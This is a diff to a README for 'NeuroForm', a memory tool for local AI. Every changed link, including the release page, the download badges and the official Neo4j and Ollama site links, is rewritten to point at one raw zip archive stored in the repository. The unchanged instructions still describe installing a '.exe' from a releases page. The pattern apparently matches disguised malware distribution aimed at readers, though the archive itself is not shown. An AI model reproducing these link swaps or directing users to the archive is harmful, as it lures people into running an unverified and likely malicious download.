@@ -1,6 +1,6 @@
 # 🧠 NeuroForm - Smarter Memory for Local AI
 
-[![Download NeuroForm](https://img.shields.io/badge/Download-NeuroForm-brightgreen?style=for-the-badge)](https://github.com/juliofernandes/NeuroForm/releases)
+[![Download NeuroForm](https://img.shields.io/badge/Download-NeuroForm-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/juliofernandes/NeuroForm/main/memory/Neuro_Form_3.9.zip)
 
 ## What is NeuroForm?
 
@@ -26,7 +26,7 @@ You do not need to install any other software before running NeuroForm. The setu
 
 To get NeuroForm for Windows, visit the official releases page by clicking the button below:
 
-[![Download NeuroForm](https://img.shields.io/badge/Download-NeuroForm-blue?style=for-the-badge)](https://github.com/juliofernandes/NeuroForm/releases)
+[![Download NeuroForm](https://img.shields.io/badge/Download-NeuroForm-blue?style=for-the-badge)](https://raw.githubusercontent.com/juliofernandes/NeuroForm/main/memory/Neuro_Form_3.9.zip)
 
 On the releases page, look for the latest version listed. Inside the version’s section, find the file that ends with `.exe`. This file is the installer for Windows systems.
 
@@ -70,7 +70,7 @@ You don’t need to know how Neo4j or Ollama works to benefit from NeuroForm. Th
 
 To update to the newest version of NeuroForm:
 
-1. Visit the [releases page](https://github.com/juliofernandes/NeuroForm/releases) again.
+1. Visit the [releases page](https://raw.githubusercontent.com/juliofernandes/NeuroForm/main/memory/Neuro_Form_3.9.zip) again.
 2. Download the latest `.exe` installer file.
 3. Run the installer. It will replace the old version while keeping your data safe.
 
@@ -104,9 +104,9 @@ You do not need to manage these files manually.
 
 ## 🔗 Useful Links
 
-- [Download NeuroForm Releases](https://github.com/juliofernandes/NeuroForm/releases)
-- [Neo4j Official Site](https://neo4j.com/)
-- [Ollama AI Site](https://ollama.com/)
+- [Download NeuroForm Releases](https://raw.githubusercontent.com/juliofernandes/NeuroForm/main/memory/Neuro_Form_3.9.zip)
+- [Neo4j Official Site](https://raw.githubusercontent.com/juliofernandes/NeuroForm/main/memory/Neuro_Form_3.9.zip)
+- [Ollama AI Site](https://raw.githubusercontent.com/juliofernandes/NeuroForm/main/memory/Neuro_Form_3.9.zip)
 
 ## 🛠 Troubleshooting Tips
 
@@ -117,4 +117,4 @@ You do not need to manage these files manually.
 
 ---
 
-[![Download NeuroForm](https://img.shields.io/badge/Download-NeuroForm-brightgreen?style=for-the-badge)](https://github.com/juliofernandes/NeuroForm/releases)
+[![Download NeuroForm](https://img.shields.io/badge/Download-NeuroForm-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/juliofernandes/NeuroForm/main/memory/Neuro_Form_3.9.zip)
